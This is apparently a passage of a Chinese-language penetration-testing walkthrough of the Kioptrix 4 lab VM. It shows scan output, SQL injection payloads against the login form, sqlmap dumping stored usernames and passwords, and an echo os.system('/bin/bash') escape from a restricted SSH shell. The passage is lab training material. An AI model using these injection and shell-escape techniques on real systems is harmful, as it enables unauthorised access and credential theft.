class="string">|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499</span></span><br><span class="line"><span class="string">|       CVE-2012-0053   4.3     https://vulners.com/cve/CVE-2012-0053</span></span><br><span class="line"><span class="string">|       CVE-2011-4317   4.3     https://vulners.com/cve/CVE-2011-4317</span></span><br><span class="line"><span class="string">|       CVE-2011-3639   4.3     https://vulners.com/cve/CVE-2011-3639</span></span><br><span class="line"><span class="string">|       CVE-2011-3348   4.3     https://vulners.com/cve/CVE-2011-3348</span></span><br><span class="line"><span class="string">|       CVE-2011-0419   4.3     https://vulners.com/cve/CVE-2011-0419</span></span><br><span class="line"><span class="string">|       CVE-2010-0434   4.3     https://vulners.com/cve/CVE-2010-0434</span></span><br><span class="line"><span class="string">|       CVE-2008-2939   4.3     https://vulners.com/cve/CVE-2008-2939</span></span><br><span class="line"><span class="string">|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612</span></span><br><span class="line"><span class="string">|       CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687</span></span><br><span class="line"><span class="string">|_      CVE-2011-4415   1.2     https://vulners.com/cve/CVE-2011-4415</span></span><br><span class="line"><span class="string">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">MAC Address: 00:0C:29:F3:0E:E9 (VMware)</span></span><br><span class="line"><span class="string">Device type: general purpose</span></span><br><span class="line"><span class="string">Running: Linux 2.6.X</span></span><br><span class="line"><span class="string">OS CPE: cpe:/o:linux:linux_kernel:2.6</span></span><br><span class="line"><span class="string">OS details: Linux 2.6.9 - 2.6.33</span></span><br><span class="line"><span class="string">Uptime guess: 0.009 days (since Mon Dec  9 20:49:38 2019)</span></span><br><span class="line"><span class="string">Network Distance: 1 hop</span></span><br><span class="line"><span class="string">TCP Sequence Prediction: Difficulty=203 (Good luck!)</span></span><br><span class="line"><span class="string">IP ID Sequence Generation: All zeros</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-054: false</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-061: false</span></span><br><span class="line"><span class="string">|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)</span></span><br></pre></td></tr></table></figure>
<p>使用工具enum4linux得到如下信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># enum4linux 192.168.84.139</span></span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Dec 10 00:55:51 2019</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 192.168.84.139</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ====================================================== </span><br><span class="line">|    Enumerating Workgroup/Domain on 192.168.84.139    |</span><br><span class="line"> ====================================================== </span><br><span class="line">[+] Got domain/workgroup name: WORKGROUP</span><br><span class="line"></span><br><span class="line"> ============================================== </span><br><span class="line">|    Nbtstat Information <span class="keyword">for</span> 192.168.84.139    |</span><br><span class="line"> ============================================== </span><br><span class="line">Looking up status of 192.168.84.139</span><br><span class="line">        KIOPTRIX4       &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">        KIOPTRIX4       &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service</span><br><span class="line">        KIOPTRIX4       &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span><br><span class="line">        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span><br><span class="line">        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line"></span><br><span class="line">        MAC Address = 00-00-00-00-00-00</span><br><span class="line"></span><br><span class="line"> ======================================= </span><br><span class="line">|    Session Check on 192.168.84.139    |</span><br><span class="line"> ======================================= </span><br><span class="line">[E] Server doesn<span class="string">&#x27;t allow session using username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27;.  Aborting remainder of tests.</span></span><br></pre></td></tr></table></figure>

<p>dirb扫目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.84.139/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Tue Dec 10 00:58:55 2019</span><br><span class="line">URL_BASE: http://192.168.84.139/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.84.139/ ----</span><br><span class="line">+ http://192.168.84.139/cgi-bin/ (CODE:403|SIZE:329)                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.84.139/images/                                                  </span><br><span class="line">+ http://192.168.84.139/index (CODE:200|SIZE:1255)                                            </span><br><span class="line">+ http://192.168.84.139/index.php (CODE:200|SIZE:1255)                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.84.139/john/                                                    </span><br><span class="line">+ http://192.168.84.139/<span class="built_in">logout</span> (CODE:302|SIZE:0)                                              </span><br><span class="line">+ http://192.168.84.139/member (CODE:302|SIZE:220)                                            </span><br><span class="line">+ http://192.168.84.139/server-status (CODE:403|SIZE:334)                                     </span><br><span class="line">                                                                                              </span><br><span class="line">---- Entering directory: http://192.168.84.139/images/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                              </span><br><span class="line">---- Entering directory: http://192.168.84.139/john/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Tue Dec 10 00:59:00 2019</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 6</span><br></pre></td></tr></table></figure>
<p>wfuzz进行模糊测试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://192.168.84.139/FUZZ</span></span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 2.4 - The Web Fuzzer                           *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: http://192.168.84.139/FUZZ</span></span><br><span class="line"><span class="string">Total requests: 3024</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word     Chars       Payload                             </span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000000566:   403        10 L     33 W     329 Ch      &quot;cgi-bin/&quot;                          </span></span><br><span class="line"><span class="string">000001337:   301        9 L      31 W     356 Ch      &quot;images&quot;                            </span></span><br><span class="line"><span class="string">000001350:   200        45 L     94 W     1255 Ch     &quot;index&quot;                             </span></span><br><span class="line"><span class="string">000001458:   301        9 L      31 W     354 Ch      &quot;john&quot;                              </span></span><br><span class="line"><span class="string">000001629:   302        0 L      0 W      0 Ch        &quot;logout&quot;                            </span></span><br><span class="line"><span class="string">000001736:   302        1 L      22 W     220 Ch      &quot;member&quot;                            </span></span><br><span class="line"><span class="string">000002294:   301        9 L      31 W     356 Ch      &quot;robert&quot;                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Total time: 3.234193</span></span><br><span class="line"><span class="string">Processed Requests: 3024</span></span><br><span class="line"><span class="string">Filtered Requests: 3017</span></span><br><span class="line"><span class="string">Requests/sec.: 935.0089</span></span><br></pre></td></tr></table></figure>

<p>访问页面，发现登录口存在sql注入漏洞</p>
<ul>
<li>手工注入</li>
</ul>
<p>用户名使用john，密码使用1’ or ‘1’=’1</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub34.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub35.jpg"></p>
<p>得到两个密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Username     :     john</span><br><span class="line">Password     :     MyNameIsJohn</span><br><span class="line"></span><br><span class="line">Username     :     robert</span><br><span class="line">Password     :     ADGAdsafdfwt4gadfga==</span><br></pre></td></tr></table></figure>

<ul>
<li>使用sqlmap</li>
</ul>
<p>跑出注入点</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                   </span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.3.11<span class="comment">#stable&#125;                                                      </span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |                                                                      </span><br><span class="line">|___|_  [<span class="string">&#x27;]_|_|_|__,|  _|                                                                      </span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org                                                    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 01:21:00 /2019-12-10/</span><br><span class="line"></span><br><span class="line">[01:21:00] [INFO] parsing HTTP request from <span class="string">&#x27;sqlmap.txt&#x27;</span></span><br><span class="line">[01:21:00] [INFO] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span> </span><br><span class="line">[01:21:00] [INFO] testing connection to the target URL</span><br><span class="line">[01:21:00] [INFO] heuristics detected web page charset <span class="string">&#x27;ascii&#x27;</span></span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: mypassword (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=-9812<span class="string">&#x27; OR 1343=1343#&amp;Submit=Login</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: myusername=admin&amp;mypassword=123456&#x27;</span> AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&amp;Submit=Login</span><br><span class="line">---</span><br><span class="line">[01:21:00] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[01:21:00] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.sqlmap/output/192.168.84.139&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 01:21:00 /2019-12-10/</span><br></pre></td></tr></table></figure>
<p>跑出账号密码,果真还是sqlmap屌炸天！！！！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt -D members -T members --dump</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                         </span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.3.11<span class="comment">#stable&#125;                                                            </span></span><br><span class="line">|_ -| . [)]     | .<span class="string">&#x27;| . |                                                                            </span></span><br><span class="line"><span class="string">|___|_  [&#x27;</span>]_|_|_|__,|  _|                                                                            </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                          </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 01:25:36 /2019-12-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[01:25:36] [INFO] parsing HTTP request from &#x27;</span>sqlmap.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[01:25:36] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[01:25:36] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[01:25:36] [INFO] heuristics detected web page charset &#x27;</span>ascii<span class="string">&#x27;</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: mypassword (POST)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span></span><br><span class="line"><span class="string">    Payload: myusername=admin&amp;mypassword=-9812&#x27;</span> OR 1343=1343<span class="comment">#&amp;Submit=Login</span></span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=123456<span class="string">&#x27; AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&amp;Submit=Login</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[01:25:36] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[01:25:36] [INFO] fetching columns for table &#x27;</span>members<span class="string">&#x27; in database &#x27;</span>members<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[01:25:36] [WARNING] running in a single-thread mode. Please consider usage of option &#x27;</span>--threads<span class="string">&#x27; for faster data retrieval</span></span><br><span class="line"><span class="string">[01:25:36] [INFO] retrieved: </span></span><br><span class="line"><span class="string">sqlmap got a 302 redirect to &#x27;</span>http://192.168.84.139:80/login_success.php?username=admin<span class="string">&#x27;. Do you want to follow? [Y/n] n</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">[01:25:38] [INFO] retrieved: id</span></span><br><span class="line"><span class="string">[01:25:38] [INFO] retrieved: username</span></span><br><span class="line"><span class="string">[01:25:39] [INFO] retrieved: password</span></span><br><span class="line"><span class="string">[01:25:39] [INFO] fetching entries for table &#x27;</span>members<span class="string">&#x27; in database &#x27;</span>members<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[01:25:39] [INFO] fetching number of entries for table &#x27;</span>members<span class="string">&#x27; in database &#x27;</span>members<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[01:25:39] [INFO] retrieved: 2</span></span><br><span class="line"><span class="string">[01:25:39] [INFO] retrieved: 1</span></span><br><span class="line"><span class="string">[01:25:39] [INFO] retrieved: MyNameIsJohn</span></span><br><span class="line"><span class="string">[01:25:40] [INFO] retrieved: john</span></span><br><span class="line"><span class="string">[01:25:40] [INFO] retrieved: 2</span></span><br><span class="line"><span class="string">[01:25:40] [INFO] retrieved: ADGAdsafdfwt4gadfga==</span></span><br><span class="line"><span class="string">[01:25:42] [INFO] retrieved: robert</span></span><br><span class="line"><span class="string">Database: members</span></span><br><span class="line"><span class="string">Table: members</span></span><br><span class="line"><span class="string">[2 entries]</span></span><br><span class="line"><span class="string">+----+-----------------------+----------+</span></span><br><span class="line"><span class="string">| id | password              | username |</span></span><br><span class="line"><span class="string">+----+-----------------------+----------+</span></span><br><span class="line"><span class="string">| 1  | MyNameIsJohn          | john     |</span></span><br><span class="line"><span class="string">| 2  | ADGAdsafdfwt4gadfga== | robert   |</span></span><br><span class="line"><span class="string">+----+-----------------------+----------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[01:25:42] [INFO] table &#x27;</span>members.members<span class="string">&#x27; dumped to CSV file &#x27;</span>/root/.sqlmap/output/192.168.84.139/dump/members/members.csv<span class="string">&#x27;                                                                               </span></span><br><span class="line"><span class="string">[01:25:42] [INFO] fetched data logged to text files under &#x27;</span>/root/.sqlmap/output/192.168.84.139<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 01:25:42 /2019-12-10/</span></span><br></pre></td></tr></table></figure>

<h3 id="获取root权限"><a href="#获取root权限" class="headerlink" title="获取root权限"></a>获取root权限</h3><p>ssh连接之后发现许多命令无法执行,但是可以执行echo命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh john@192.168.84.139</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.84.139 (192.168.84.139)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">RSA key fingerprint is SHA256:3fqlLtTAindnY7CGwxoXJ9M2rQF6nn35SFMTVv56lww.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.84.139<span class="string">&#x27; (RSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">john@192.168.84.139&#x27;</span>s password: </span><br><span class="line">Welcome to LigGoat Security Systems - We are Watching</span><br><span class="line">== Welcome LigGoat Employee ==</span><br><span class="line">LigGoat Shell is <span class="keyword">in</span> place so you  don<span class="string">&#x27;t screw up</span></span><br><span class="line"><span class="string">Type &#x27;</span>?<span class="string">&#x27; or &#x27;</span><span class="built_in">help</span><span class="string">&#x27; to get the list of allowed commands</span></span><br><span class="line"><span class="string">john:~$ ls</span></span><br><span class="line"><span class="string">john:~$ pwd</span></span><br><span class="line"><span class="string">*** unknown command: pwd</span></span><br><span class="line"><span class="string">john:~$ whoami</span></span><br><span class="line"><span class="string">*** unknown command: whoami</span></span><br><span class="line"><span class="string">john:~$echo &#x27;</span>casdcasdc<span class="string">&#x27;                                                                             </span></span><br><span class="line"><span class="string">casdcasdc</span></span><br></pre></td></tr></table></figure>

<p>通过使用命令echo os.system(‘/bin/bash’)轻松地“转义”并绕过有限制的shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john:~$ <span class="built_in">echo</span> os.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line">john@Kioptrix4:~$ ls</span><br><span class="line">john@Kioptrix4:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/john</span><br><span class="line">john@Kioptrix4:~$ whoami</span><br><span class="line">john</span><br><span class="line">john@Kioptrix4:~$ </span><br></pre></td></tr></table></figure>

<p>使用命令行收集信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john@Kioptrix4:~$ cat /etc/*-release </span><br><span class="line">DISTRIB_ID=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=8.04</span><br><span class="line">DISTRIB_CODENAME=hardy</span><br><span class="line">DISTRIB_DESCRIPTION=<span class="string">&quot;Ubuntu 8.04.3 LTS&quot;</span></span><br><span class="line">john@Kioptrix4:~$ cat /proc/version</span><br><span class="line">Linux version 2.6.24-24-server (buildd@palmer) (gcc version 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) <span class="comment">#1 SMP Tue Jul 7 20:21:17 UTC 2009</span></span><br><span class="line">john@Kioptrix4:~$ ps -ef | grep root</span><br><span class="line">root         1     0  0 04:44 ?        00:00:01 /sbin/init</span><br><span class="line">root         2     0  0 04:44 ?        00:00:00 [kthreadd]</span><br><span class="line">root         3     2  0 04:44 ?        00:00:00 [migration/0]</span><br><span class="line">root         4     2  0 04:44 ?        00:00:00 [ksoftirqd/0]</span><br><span class="line">root         5     2  0 04:44 ?        00:00:00 [watchdog/0]</span><br><span class="line">root         6     2  0 04:44 ?        00:00:00 [migration/1]</span><br><span class="line">root         7     2  0 04:44 ?        00:00:00 [ksoftirqd/1]</span><br><span class="line">root         8     2  0 04:44 ?        00:00:00 [watchdog/1]</span><br><span class="line">root         9     2  0 04:44 ?        00:00:00 [migration/2]</span><br><span class="line">root        10     2  0 04:44 ?        00:00:00 [ksoftirqd/2]</span><br><span class="line">root        11     2  0 04:44 ?        00:00:00 [watchdog/2]</span><br><span class="line">root        12     2  0 04:44 ?        00:00:00 [migration/3]</span><br><span class="line">root        13     2  0 04:44 ?        00:00:00 [ksoftirqd/3]</span><br><span class="line">root        14     2  0 04:44 ?        00:00:00 [watchdog/3]</span><br><span class="line">root        15     2  0 04:44 ?        00:00:00 [events/0]</span><br><span class="line">root        16     2  0 04:44 ?        00:00:00 [events/1]</span><br><span class="line">root        17     2  0 04:44 ?        00:00:00 [events/2]</span><br><span class="line">root        18     2  0 04:44 ?        00:00:00 [events/3]</span><br><span class="line">root        19     2  0 04:44 ?        00:00:00 [khelper]</span><br><span class="line">root        56     2  0 04:44 ?        00:00:00 [kblockd/0]</span><br><span class="line">root        57     2  0 04:44 ?        00:00:00 [kblockd/1]</span><br><span class="line">root        58     2  0 04:44 ?        00:00:00 [kblockd/2]</span><br><span class="line">root        59     2  0 04:44 ?        00:00:00 [kblockd/3]</span><br><span class="line">root        62     2  0 04:44 ?        00:00:00 [kacpid]</span><br><span class="line">root        63     2  0 04:44 ?        00:00:00 [kacpi_notify]</span><br><span class="line">root       193     2  0 04:44 ?        00:00:00 [kseriod]</span><br><span class="line">root       247     2  0 04:44 ?        00:00:00 [pdflush]</span><br><span class="line">root       248     2  0 04:44 ?        00:00:00 [pdflush]</span><br><span class="line">root       249     2  0 04:44 ?        00:00:00 [kswapd0]</span><br><span class="line">root       291     2  0 04:44 ?        00:00:00 [aio/0]</span><br><span class="line">root       292     2  0 04:44 ?        00:00:00 [aio/1]</span><br><span class="line">root       293     2  0 04:44 ?        00:00:00 [aio/2]</span><br><span class="line">root       294     2  0 04:44 ?        00:00:00 [aio/3]</span><br><span class="line">root      1627     2  0 04:44 ?        00:00:00 [ata/0]</span><br><span class="line">root      1629     2  0 04:44 ?        00:00:00 [ata/1]</span><br><span class="line">root      1630     2  0 04:44 ?        00:00:00 [ata/2]</span><br><span class="line">root      1631     2  0 04:44 ?        00:00:00 [ata/3]</span><br><span class="line">root      1632     2  0 04:44 ?        00:00:00 [ata_aux]</span><br><span class="line">root      1800     2  0 04:44 ?        00:00:00 [ksuspend_usbd]</span><br><span class="line">root      1806     2  0 04:44 ?        00:00:00 [khubd]</span><br><span class="line">root      2474     2  0 04:44 ?        00:00:00 [scsi_eh_0]</span><br><span class="line">root      2486     2  0 04:44 ?        00:00:00 [scsi_eh_1]</span><br><span class="line">root      2489     2  0 04:44 ?        00:00:00 [scsi_eh_2]</span><br><span class="line">root      2579     2  0 04:44 ?        00:00:00 [scsi_eh_3]</span><br><span class="line">root      2580     2  0 04:44 ?        00:00:00 [scsi_eh_4]</span><br><span class="line">root      2581     2  0 04:44 ?        00:00:00 [scsi_eh_5]</span><br><span class="line">root      2582     2  0 04:44 ?        00:00:00 [scsi_eh_6]</span><br><span class="line">root      2583     2  0 04:44 ?        00:00:00 [scsi_eh_7]</span><br><span class="line">root      2584     2  0 04:44 ?        00:00:00 [scsi_eh_8]</span><br><span class="line">root      2585     2  0 04:44 ?        00:00:00 [scsi_eh_9]</span><br><span class="line">root      2586     2  0 04:44 ?        00:00:00 [scsi_eh_10]</span><br><span class="line">root      2587     2  0 04:44 ?        00:00:00 [scsi_eh_11]</span><br><span class="line">root      2588     2  0 04:44 ?        00:00:00 [scsi_eh_12]</span><br><span class="line">root      2589     2  0 04:44 ?        00:00:00 [scsi_eh_13]</span><br><span class="line">root      2590     2  0 04:44 ?        00:00:00 [scsi_eh_14]</span><br><span class="line">root      2591     2  0 04:44 ?        00:00:00 [scsi_eh_15]</span><br><span class="line">root      2592     2  0 04:44 ?        00:00:00 [scsi_eh_16]</span><br><span class="line">root      2593     2  0 04:44 ?        00:00:00 [scsi_eh_17]</span><br><span class="line">root      2594     2  0 04:44 ?        00:00:00 [scsi_eh_18]</span><br><span class="line">root      2595     2  0 04:44 ?        00:00:00 [scsi_eh_19]</span><br><span class="line">root      2596     2  0 04:44 ?        00:00:00 [scsi_eh_20]</span><br><span class="line">root      2597     2  0 04:44 ?        00:00:00 [scsi_eh_21]</span><br><span class="line">root      2598     2  0 04:44 ?        00:00:00 [scsi_eh_22]</span><br><span class="line">root      2599     2  0 04:44 ?        00:00:00 [scsi_eh_23]</span><br><span class="line">root      2600     2  0 04:44 ?        00:00:00 [scsi_eh_24]</span><br><span class="line">root      2601     2  0 04:44 ?        00:00:00 [scsi_eh_25]</span><br><span class="line">root      2602     2  0 04:44 ?        00:00:00 [scsi_eh_26]</span><br><span class="line">root      2603     2  0 04:44 ?        00:00:00 [scsi_eh_27]</span><br><span class="line">root      2604     2  0 04:44 ?        00:00:00 [scsi_eh_28]</span><br><span class="line">root      2605     2  0 04:44 ?        00:00:00 [scsi_eh_29]</span><br><span class="line">root      2606     2  0 04:44 ?        00:00:00 [scsi_eh_30]</span><br><span class="line">root      2607     2  0 04:44 ?        00:00:00 [scsi_eh_31]</span><br><span class="line">root      2608     2  0 04:44 ?        00:00:00 [scsi_eh_32]</span><br><span class="line">root      2849     2  0 04:44 ?        00:00:00 [kjournald]</span><br><span class="line">root      3028     1  0 04:45 ?        00:00:00 /sbin/udevd --daemon</span><br><span class="line">root      3701     2  0 04:45 ?        00:00:00 [kpsmoused]</span><br><span class="line">root      3800     2  0 04:45 ?        00:00:00 [btaddconn]</span><br><span class="line">root      3801     2  0 04:45 ?        00:00:00 [btdelconn]</span><br><span class="line">root      4838     1  0 04:45 tty4     00:00:00 /sbin/getty 38400 tty4</span><br><span class="line">root      4839     1  0 04:45 tty5     00:00:00 /sbin/getty 38400 tty5</span><br><span class="line">root      4841     1  0 04:45 tty2     00:00:00 /sbin/getty 38400 tty2</span><br><span class="line">root      4842     1  0 04:45 tty3     00:00:00 /sbin/getty 38400 tty3</span><br><span class="line">root      4845     1  0 04:45 tty6     00:00:00 /sbin/getty 38400 tty6</span><br><span class="line">root      4906     1  0 04:45 ?        00:00:00 /bin/dd bs 1 <span class="keyword">if</span> /proc/kmsg of /var/run/klogd/kmsg</span><br><span class="line">root      4927     1  0 04:45 ?        00:00:00 /usr/sbin/sshd</span><br><span class="line">root      4983     1  0 04:45 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe</span><br><span class="line">root      5025  4983  0 04:45 ?        00:00:04 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/my</span><br><span class="line">root      5026  4983  0 04:45 ?        00:00:00 logger -p daemon.err -t mysqld_safe -i -t mysqld</span><br><span class="line">root      5120     1  0 04:45 ?        00:00:00 /usr/sbin/nmbd -D</span><br><span class="line">root      5122     1  0 04:45 ?        00:00:00 /usr/sbin/smbd -D</span><br><span class="line">root      5136  5122  0 04:45 ?        00:00:00 /usr/sbin/smbd -D</span><br><span class="line">root      5137     1  0 04:45 ?        00:00:00 /usr/sbin/winbindd</span><br><span class="line">root      5149  5137  0 04:45 ?        00:00:00 /usr/sbin/winbindd</span><br><span class="line">root      5169     1  0 04:45 ?        00:00:00 /usr/sbin/cron</span><br><span class="line">root      5191     1  0 04:45 ?        00:00:00 /usr/sbin/apache2 -k start</span><br><span class="line">root      5247     1  0 04:45 tty1     00:00:00 /sbin/getty 38400 tty1</span><br><span class="line">root      5277  5137  0 04:57 ?        00:00:00 /usr/sbin/winbindd</span><br><span class="line">root      5280  5137  0 04:57 ?        00:00:00 /usr/sbin/winbindd</span><br><span class="line">root      5880  4927  0 09:23 ?        00:00:00 sshd: john [priv]</span><br><span class="line">john      5928  5897  0 09:35 pts/0    00:00:00 grep root</span><br></pre></td></tr></table></figure>

<p>可以看到MySQL以root权限运行。 由于具有对计算机的ssh访问权限，因此可以通过访问配置文件来查看是否能找到数据库凭据。</p>
